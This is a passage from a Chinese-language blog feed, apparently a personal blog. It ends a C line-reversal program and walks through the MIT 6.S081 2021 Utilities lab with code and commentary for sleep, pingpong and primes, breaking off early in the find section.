		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getline</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>cur<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>sz<span class="token punctuation">,</span> fp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 读到文件末尾，删去当前无效结点并结束循环</span>
			line_node<span class="token operator">*</span> temp <span class="token operator">=</span> cur<span class="token punctuation">;</span>
			cur <span class="token operator">=</span> pre<span class="token punctuation">;</span>
			<span class="token function">free</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		cur<span class="token operator">-></span>next <span class="token operator">=</span> pre<span class="token punctuation">;</span> <span class="token comment">// 链表反转</span>
		pre <span class="token operator">=</span> cur<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> cur<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 写入反转后的数据到文件fp</span>
<span class="token keyword">void</span> <span class="token function">write_to_file</span><span class="token punctuation">(</span>line_node<span class="token operator">*</span> cur<span class="token punctuation">,</span> FILE<span class="token operator">*</span> fp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span>cur <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">fprintf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token string">"%s"</span><span class="token punctuation">,</span> cur<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
		line_node<span class="token operator">*</span> temp <span class="token operator">=</span> cur<span class="token punctuation">;</span>
		cur <span class="token operator">=</span> cur<span class="token operator">-></span>next<span class="token punctuation">;</span>
		<span class="token function">free</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	line_node<span class="token operator">*</span> cur <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	
	<span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		cur <span class="token operator">=</span> <span class="token function">read_from_file</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">write_to_file</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">>=</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> argc <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"reverse: cannot open file '%s'\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		cur <span class="token operator">=</span> <span class="token function">read_from_file</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
		
		<span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token function">write_to_file</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
			FILE<span class="token operator">*</span> fp2 <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>fp2 <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"reverse: cannot open file '%s'\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_same_file</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"reverse: input and output file must differ\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token function">write_to_file</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span> fp2<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">fclose</span><span class="token punctuation">(</span>fp2<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
		<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"usage: reverse &lt;input> &lt;output>\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
        <tag>C</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>MIT6.s081 2021 Lab Utilities</title>
    <url>/2024/06/24/MIT6.s081-2021-Lab%20Utilities/</url>
    <content><![CDATA[<h1 id="Boot-xv6"><a href="#Boot-xv6" class="headerlink" title="Boot xv6"></a>Boot xv6</h1><p>按照示例切换到 <code>util</code> 分支后，看到目录下包含 <code>Makefile</code> 文件，执行 <code>make qemu</code> 即可。</p>
<h1 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>借助系统调用 <code>sleep</code> 实现一个命令行程序，关键是要找到封装了系统调用的 C 函数的位置，根据提示：</p>
<blockquote>
<p>… <code>user/user.h</code> for the C definition of <code>sleep</code> callable from a user program …</p>
</blockquote>
<p>可知该函数的声明位于 <code>user.h</code> 头文件中，声明方式很简单：</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>将其“拷贝”（include）到需要编写的代码 <code>user/sleep.c</code> 中，调用 <code>sleep(&lt;睡眠时间&gt;)</code> 即可。</p>
<p>最后，按照提示，将编写的 <code>sleep</code> 代码添加到 Makefile 的 <code>UPROGS</code> 中，添加后如下所示：</p>
<pre class="language-makefile" data-language="makefile"><code class="language-makefile">UPROGS<span class="token operator">=</span>\
    <span class="token variable">$U/_cat\</span>
    <span class="token variable">$U/_echo\</span>
    <span class="token variable">$U/_forktest\</span>
    <span class="token variable">$U/_grep\</span>
    <span class="token variable">$U/_init\</span>
    <span class="token variable">$U/_kill\</span>
    <span class="token variable">$U/_ln\</span>
    <span class="token variable">$U/_ls\</span>
    <span class="token variable">$U/_mkdir\</span>
    <span class="token variable">$U/_rm\</span>
    <span class="token variable">$U/_sh\</span>
    <span class="token variable">$U/_stressfs\</span>
    <span class="token variable">$U/_usertests\</span>
    <span class="token variable">$U/_grind\</span>
    <span class="token variable">$U/_wc\</span>
    <span class="token variable">$U/_zombie\</span>
    <span class="token variable">$U/_sleep\</span></code></pre>

<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// user/sleep.c</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/types.h"</span> <span class="token comment">// 注意先包含types.h</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"user/user.h"</span>    <span class="token comment">// 再包含user.h（user.h中存在在types.h中定义的别名）</span></span>


<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"sleep: argument count error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">int</span> time <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">sleep</span><span class="token punctuation">(</span>time<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="pingpong"><a href="#pingpong" class="headerlink" title="pingpong"></a>pingpong</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>本题主要是要理解管道的接口设计，以及借助该接口实现父进程与子进程之间的通信。这是 <code>xv6</code> 文档中对于 <code>pipe</code> 调用的描述：</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">pipe</span><span class="token punctuation">(</span><span class="token keyword">int</span> p<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">// Create a pipe, put read/write file descriptors in p[0] and p[1].</span></code></pre>

<p><code>pipe</code> 创建一个管道，并分别将该管道的读、写端文件描述符置为 <code>p[0]</code> 和 <code>p[1]</code>，之后调用 <code>fork</code> 创建一个子进程，由于 <code>fork</code> 的作用是将父进程的数据直接拷贝给子进程，因此子进程同时继承了父进程的管道文件描述符，可以借助该文件描述符进行进程间通信（IPC），相当于借助一个共享文件进行通信，只不过该“文件”存储在内存的内核区域中，而不占用实际的磁盘存储空间。</p>
<p>利用管道解决本题的基本流程如下，首先需要创建两个管道 pa 和 pb，然后：</p>
<ol>
<li>父进程向管道 pa 的写端写入 1 字节数据，然后关闭 pa 的写端。</li>
<li>子进程从管道 pa 的读端读取 1 字节数据，然后关闭 pa 的读端，打印信息，然后向管道 pb 的写端写入 1 字节数据，关闭 pb 的写端。</li>
<li>父进程从管道 pb 的读端读取 1 字节数据，关闭 pb 的读端，最后打印信息。</li>
</ol>
<p>这里需要解释一下为什么需要两个管道（只是<strong>个人的方法</strong>，其它方法可能只需要一个管道），由于进程调度策略的影响，父进程和子进程的执行顺序并不确定。可能出现这样一种情况：在 <code>fork</code> 创建子进程后，父进程先被调度，将 1 字节数据写入管道，这时理想的情况是子进程被调度，然后读取父进程发送的数据，但是事实可能并不会如我们所愿，子进程可能一直得不到调度，父进程继续向下执行，从管道中读取自己刚刚发送的 1 字节的数据，这样子进程就无法收到父进程发送的数据，父子进程之间的通信也就失败了。</p>
<p>通过创建两个管道，并分别关闭对应的读端和写端，就能够得到两个单向数据流的管道，也就不会有上述自己写入的数据被被自己读取的情况出现。</p>
<h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// user/pingpong.c</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/types.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"user/user.h"</span></span>


<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

	<span class="token keyword">int</span> pa<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> pb<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token function">pipe</span><span class="token punctuation">(</span>pa<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">pipe</span><span class="token punctuation">(</span>pb<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">int</span> pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">close</span><span class="token punctuation">(</span>pa<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">close</span><span class="token punctuation">(</span>pb<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">// phase_2</span>
		<span class="token function">read</span><span class="token punctuation">(</span>pa<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">close</span><span class="token punctuation">(</span>pa<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d: received ping\n"</span><span class="token punctuation">,</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">write</span><span class="token punctuation">(</span>pb<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">close</span><span class="token punctuation">(</span>pb<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">close</span><span class="token punctuation">(</span>pa<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">close</span><span class="token punctuation">(</span>pb<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">// phase_1</span>
		<span class="token function">write</span><span class="token punctuation">(</span>pa<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">close</span><span class="token punctuation">(</span>pa<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">// phase_3</span>
		<span class="token function">read</span><span class="token punctuation">(</span>pb<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">close</span><span class="token punctuation">(</span>pb<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d: received pong\n"</span><span class="token punctuation">,</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
		<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"pingpong: fork failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="primes"><a href="#primes" class="headerlink" title="primes"></a>primes</h1><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>实现一个基于管道的并发埃式筛（The sieve of Eratosthenes），关键是要理解管道的机制，以及仔细阅读题干给出的<a href="https://swtch.com/~rsc/thread/">文章</a>，该文章有关该埃式筛方法的介绍图片如下所示：</p>
<p><img src="/2024/06/24/MIT6.s081-2021-Lab%20Utilities/primes.png"></p>
<p>该算法的个人感觉十分精妙，以下是基本流程：</p>
<ol>
<li>进程 0（主进程）发出一系列从 2 开始的整数序列。</li>
<li>进程 1 首先接收来自进程 0 发出的第一个整数 prime，prime 一定是一个质数，将其打印出来。然后继续按顺序接收来自进程 0 发出的其它整数，若接收到的某个整数能够被 prime 整除，则丢弃它（不做处理），否则将该整数发送给下一个进程。</li>
<li>后续进程的操作与进程 1 类似，直到没有任何整数发送给下一个进程，程序终止。</li>
</ol>
<p>算法的思路并不复杂，主要问题在于如何使用管道实现上述流程中进程 i 与进程 i + 1 之间的通信。我这里只使用了一个 <code>int[2]</code> 来轮换地存放管道的文件描述符，并使用一个缓冲区来暂存每次要发送给下一个进程的数，在一个进程完成它所做的工作后，再将缓冲区中的数据批量写入管道，并创建子进程来完成接下来的工作。这里要千万注意管道完成读取或写入后及时关闭，否则可能会出现子进程读取管道时阻塞的情况。</p>
<p>我在写下这篇博客的过程中发现，虽然我使用的这个方法能够达到预期的效果，并成功通过测试用例，但是其实是有一定问题的：本方法的处理过程是串行的。事实上，每个进程都是在将本进程的所有工作全部完成之后，再调用 <code>fork</code> 来创建子进程，完成后续的工作，本质上与放在一个进程中完成所有工作并没有区别，与文章中提到的 “<em>Concurrent</em>” 完全相悖。理想的做法应该是创建一个 <code>int[2]</code> 数组来存放管道的文件描述符，并及时 <code>fork</code> 子进程来工作，以此来实现并发，具体的代码实现有待后续改进。</p>
<h2 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// user/primes.c</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/types.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"user/user.h"</span></span>


<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> p<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token function">pipe</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">int</span> buf<span class="token punctuation">;</span>
	<span class="token keyword">int</span> plist<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">35</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">write</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>i<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token function">close</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">int</span> prime <span class="token operator">=</span> buf<span class="token punctuation">;</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"prime %d\n"</span><span class="token punctuation">,</span> prime<span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">int</span> pcnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>buf <span class="token operator">%</span> prime<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				plist<span class="token punctuation">[</span>pcnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> buf<span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token function">close</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token function">pipe</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// rotating pipe</span>

		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pcnt<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token function">write</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>plist <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token function">close</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">int</span> pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">continue</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token function">wait</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
			<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"primes: fork error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>

	<span class="token punctuation">&#125;</span>

	<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="find"><a href="#find" class="headerlink" title="find"></a>find</h1><h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>本题是这个 Lab 中我花费时间最长的，代码思路虽然不算很复杂，但是有很多的细节问题我在写的时候没有考虑到，感觉 debug 时间差不多是 coding 的几倍了。。。</p>
<p>题目要求实现一个简易的 <code>find</code> 命令，根据提示可以参考 <code>user/ls.c</code> 对目录的读取操作，并使用递归来实现对子目录的查找。基本思路就是打开一个指定路径的文件（目录也算是特殊的文件），并根据文件的类型做不同处理：</p>
<ol>
<li>如果文件是常规文件，则判断改文件名是否是目标文件名（<code>find</code> 的第二个参数），如果是，则将其完整路径打印至标准输出。</li>
<li>如果文件是目录文件，则读取该目录下的所有文件名，并在该目录路径尾部加上 <code>/st.name</code>，依次构造一个新的文件名继续递归调用 <code>find</code>。注意不要递归进入 <code>.</code> 和 <code>..</code>，否则将导致无限递归。 </li>
</ol>
<p>以上便是基本思路，具体实现可以阅读完整代码，下面讲一下我遇到的一些问题（bug）：</p>
<ol>
<li>使用 <code>fstat</code> 获取文件信息时 <code>st.type</code> 始终为 3（<code>T_DEVICE</code> 类型）。</li>
</ol>
<p>这个问题其实挺难绷的，原因是我把 <code>if ((fd = open(path, 0)) &lt; 0)</code> 写成了 <code>if ((fd = open(path, 0) &lt; 0))</code>，因为 <code>&lt;</code> 的优先级大于 <code>=</code>，所以导致 <code>fd</code> 的值始终为 0 或 1（逻辑表达式的值只能为真或假），那么后续产生意想不到的结果也就不意外了。。。</p>
